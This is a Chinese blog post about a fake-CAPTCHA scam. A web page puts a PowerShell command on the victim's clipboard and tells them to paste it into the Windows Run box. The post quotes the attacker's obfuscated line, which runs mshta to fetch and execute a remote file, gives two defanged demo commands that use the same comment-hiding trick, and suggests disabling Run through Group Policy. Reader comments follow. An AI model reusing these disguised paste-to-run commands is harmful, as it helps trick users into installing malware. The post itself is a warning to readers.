---
title: 警惕：一种新型社交工程学挂马方案 — 眼见不一定为真
url: https://h4ck.org.cn/2025/02/19271
source: obaby@mars
date: 2025-02-15
fetch_date: 2025-10-06T20:33:07.842804
---

# 警惕：一种新型社交工程学挂马方案 — 眼见不一定为真

[![obaby@mars](/wp-content/uploads/2023/08/logo-pink-small.png)](https://h4ck.org.cn)

Artificial Intelligence / Reverse Engineering / Internet of Things / Full Stack Developer

* [※说说/Talk※](https://h4ck.org.cn/talk)
* [※留言/Msg※](https://h4ck.org.cn/guestbook)
* [※归档/File※](https://h4ck.org.cn/myarchive)
* [※资源/Res※](https://h4ck.org.cn/res-page)
* [※我是谁/Me※](https://h4ck.org.cn/whoami)
* [※集美们/Besties※](https://h4ck.org.cn/besties)

 [Menu](#mobilemenu)

* [※说说/Talk※](https://h4ck.org.cn/talk)
* [※留言/Msg※](https://h4ck.org.cn/guestbook)
* [※归档/File※](https://h4ck.org.cn/myarchive)
* [※资源/Res※](https://h4ck.org.cn/res-page)
* [※我是谁/Me※](https://h4ck.org.cn/whoami)
* [※集美们/Besties※](https://h4ck.org.cn/besties)

[病毒分析『Virus Analysis』](https://h4ck.org.cn/cats/crackasm/bdfx)

# 警惕：一种新型社交工程学挂马方案 — 眼见不一定为真

2025年2月14日
[64 条评论](https://h4ck.org.cn/2025/02/19271#comments)

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/10621739427075111_.pic_.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/02/10621739427075111_.pic_.jpg)

昨天晚上刷微博的时候，看到教主发的[《现在黑产有一种新的社交工程学挂马方案》](https://weibo.com/6827625527/Pe6VpcQ9q) ，虽然技术不高深，但是迷惑性还是蛮大的。也是因为看不懂教主发的微博，让我时常自惭形秽。

看描述，应该是在访问一些网站的时候会弹出人机验证的界面，根据截图看来应该是国外的网站，国内网站未为可知，或者也有。当然，这种网站基本都不可能是什么正规网站，即使现在中文网站没用这些技术，可能过几天也就出了中文版本了。

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj2g41sovj30rq0uojvy.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj2g41sovj30rq0uojvy.jpg)

基于这种验证，在弹出这个窗口的时候页面已经将要粘贴到文本内容写入了粘贴板，此时你按照页面提示，按下键盘的 Win +R 键，此时会弹出运行窗口，然后，你再按 Ctrl +v 粘贴验证文本，此时运行窗口就变成了下面的样子：

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj2l0w14wj30he091419.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj2l0w14wj30he091419.jpg)

真的不同的 windows 版本（系统设置）可能前面的选择框样式有所区别，但是看起来似乎没什么问题对不对？

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/Screenshot-2025-02-13-223411.png)](https://h4ck.org.cn/wp-content/uploads/2025/02/Screenshot-2025-02-13-223411.png)

此时你要执行第三步了，按键盘的 Enter 或者点击确定。点了之后，一个黑窗口出来又消失了，似乎没什么变化，然而，就在这时候，你已经下载了黑客的木马文件并且执行了，而这个操作，火绒似乎也不会有什么反应。

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/Jietu20250214-091526.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/02/Jietu20250214-091526.jpg)

那么问题出在什么地方呢？当然是你复制到运行窗口内的那段文字，实际上全部内容应该是类似下面的样子：

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj2m5a4qkj30r70inguy.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj2m5a4qkj30r70inguy.jpg)

然而，这段经过精心设计的问题，在粘贴到运行窗口之后。由于运行窗口默认显示机制是显示最后的文本，那么刚好就显示了想让你看到的那一段：

```
✅ 'I am not a robot: CAPTCHA Verification UID: 1314
```

让你自以为是在做验证，然而，这一句是注释，真正有用的是前面的这一段：

```
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=('ms' + 'hta' + '.exe '+$l)}
```

通过 mshta.exe 加文件路径反问文件并且执行。那么知道怎么实现的，我稍微改造了一下，不会产生任何的危害，也可以测试下效果。

例如复制下面这段，运行之后会打开计算器：

```
powershell -w 1 -C "$l='https://oba.by/';Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=('cal' + 'c' + '.exe ')}" # ✅ 'I am not a robot: CAPTCHA Verification UID: 1314'
```

运行效果：
﻿

下面这行命令会在运行之后直接打开我的博客：

```
powershell -w 1 -C "$l='https://oba.by/';Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=('C:\Program Files\Internet Explorer\iexplor' + 'e' + '.exe  https://oba.by')}" # ✅ 'I am not a robot: CAPTCHA Verification UID: 1314'
```

运行效果：
﻿
要解决这个问题，最简单的是不要在脱离当前程序运行任何命令，当然，也可以按照教主的做法，直接禁用运行：

Win+R，输入 gpedit.msc 运行。然后打开[用户配置] -> [管理模板] -> [“开始”菜单和任务栏]，找到[从“开始”菜单中删除“运行”菜单]，双击打开，选择“已启用”。

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj9qs0dosj30sw0qvgwv.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj9qs0dosj30sw0qvgwv.jpg)

设置之后再次按 win +R 就会出现下面的提示：

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj9j3degyj30ik058wfp.jpg)](https://h4ck.org.cn/wp-content/uploads/2025/02/007s41inly1hyj9j3degyj30ik058wfp.jpg)

如果要恢复功能，在开始菜单直接搜索gpedit.msc，点击运行之后将选项改为未配置或者已禁用即可。

[![](https://h4ck.org.cn/wp-content/uploads/2025/02/21605d299dff810d443c5e9923a16b8a.gif)](https://h4ck.org.cn/wp-content/uploads/2025/02/21605d299dff810d443c5e9923a16b8a.gif)

简而言之，上网要小心，眼见不一定为真，不然，哪里有那么多的美女呢！**祝大家情人节快乐啊！**

☆版权☆

\* 网站名称：**[obaby@mars](https://h4ck.org.cn/)**
\* 网址：<https://h4ck.org.cn/>
\* 个性：<https://oba.by/>
\* 本文标题： [《警惕：一种新型社交工程学挂马方案 — 眼见不一定为真》](https://h4ck.org.cn/2025/02/19271)
\* 本文链接：<https://h4ck.org.cn/2025/02/19271>
\* 短链接：<https://oba.by/?p=19271>
\* 转载文章请标明文章来源，原文标题以及原文链接。请遵从 [《署名-非商业性使用-相同方式共享 2.5 中国大陆 (CC BY-NC-SA 2.5 CN) 》](https://creativecommons.org/licenses/by-nc-sa/2.5/cn/)许可协议。

---

[木马](https://h4ck.org.cn/tags/%E6%9C%A8%E9%A9%AC)[病毒](https://h4ck.org.cn/tags/%E7%97%85%E6%AF%92)[社会工程学](https://h4ck.org.cn/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6)

[Previous Post](https://h4ck.org.cn/2025/02/19296)
[Next Post](https://h4ck.org.cn/2025/02/19232)

![obaby](https://gg.lang.bi/avatar/d6ebc088df916bcc9e8b94a09f9b0f604e57be54b04bd520c6db2492740fc563?s=90&d=identicon&r=r)

#### obaby

爱好广泛的火星小妖精，有问题欢迎留言交流啊~(✪ω✪)
爬虫类工具请先点击这个链接查看用法https://oba.by/?p=12240
闺蜜圈APP下载 https://guimiquan.cn

#### 猜你喜欢：

2010年11月4日

#### [“妃雅照片”病毒的简单分析](https://h4ck.org.cn/2010/11/2061)

2023年12月19日

#### [抓马记](https://h4ck.org.cn/2023/12/14787)

2025年8月19日

#### [牧马人 — 基于 clamav 的服务器实时监控系统](https://h4ck.org.cn/2025/08/21364)

### 64 comments

1. ![](https://gg.lang.bi/avatar/65cd1f408c1cc0949b34d3cd2acad0cb5a2b8c362ebf31ca9ee0dc9edcc63e81?s=64&d=identicon&r=r) **[似水流年](https://my1981.cn)**说道：

   [2025年2月14日 09:36](https://h4ck.org.cn/2025/02/19271#comment-123683)

   ![](https://badgen.net/badge/友链/集美们/blue?icon=chrome) ![Level 6](https://badgen.net/badge/亲密度/Level 6/red?icon=codebeat)

   ![IBrowse r](https://h4ck.org.cn/wp-content/plugins/wp-useragent/img/16/net/ibrowse.png "IBrowse r") IBrowse r ![Android 12](https://h4ck.org.cn/wp-content/plugins/wp-useragent/img/16/os/android.png "Android 12") Android 12 ![cn](https://h4ck.org.cn/wp-content/plugins/wp-useragent/show-useragent/flags_svg/cn.svg "cn")

   这种我还没见过，人机验证倒是挺常见，看来是我访问的网站还不够多。 ![laugh1](https://h4ck.org.cn/wp-content/plugins/kama-wp-smile/packs/qip/laugh1.gif)

   [回复](#comment-123683)

   1. ![](https://gg.lang.bi/avatar/d6ebc088df916bcc9e8b94a09f9b0f604e57be54b04bd520c6db2492740fc563?s=64&d=identicon&r=r)

      [2025年2月14日 09:41](https://h4ck.org.cn/2025/02/19271#comment-123686)

      ![公主](https://badgen.net/badge/管理员/小妖精/ff91a4?icon=terminal) ![Queen](https://badgen.net/badge/角色/女王/red?icon=matrix)

      ![Google Chrome 126](https://h4ck.org.cn/wp-content/plugins/wp-useragent/img/16/net/chrome.png "Google Chrome 126") Google Chrome 126 ![Mac OS X 10.15](https://h4ck.org.cn/wp-content/plugins/wp-useragent/img/16/os/mac-3.png "Mac OS X 10.15") Mac OS X 10.15 ![cn](https://h4ck.org.cn/wp-content/plugins/wp-useragent/show-useragent/flags_svg/cn.svg "cn")

      提前通知一下，小心中招。嘻嘻

      [回复](#comment-123686)
   2. ![](https://gg.lang.bi/avatar/19a53855a6616e2ead18670b736d1917a8b5dbe3f22d629e637d9e3f384e451f?s=64&d=identicon&r=r)

      [2025年2月14日 18:32](https://h4ck.org.cn/2025/02/19271#comment-123738)

      ![](https://badgen.net/badge/用户/已认证/CCFF33?icon=rss) ![Level 6](https://badgen.net/badge/亲密度/Level 6/red?icon=codebeat)

      ![WebView 4](https://h4ck.org.cn/wp-content/plugins/wp-useragent/img/16/net/android-webkit.png "WebView 4") WebView 4 ![Android 12](https://h4ck.org.cn/wp-content/plugins/wp-useragent/img/16/os/android.png "Android 12") Android 12 ![cn](https://h4ck.org.cn/wp-content/plugins/wp-useragent/show-useragent/flags_svg/cn.svg "cn")

      天哪，现在的人机校验都这么高级了，不过只能骗小白，有经验的会疑问输入验证码为什么要打开win + R，没必要啊，而且是这是执行程序，就马上起戒备心了，就不搞了，哈哈哈

      [回复](#comment-123738)

      1. ![](https://gg.lang.bi/avatar/d6ebc088df916bcc9e8b94a09f9b0f604e57be54b04bd520c6db2492740fc563?s=64&d=identicon&r=r)

         [2025年2月14日 22:33](https://h4ck.org.cn/2025/02/19271#comment-123744)

         ![公主](https://badgen.net/badge/管理员/小妖精/ff91a4?icon=terminal) ![Queen](https://badgen.net/badge/角色/女王/red?icon=matrix)

        ...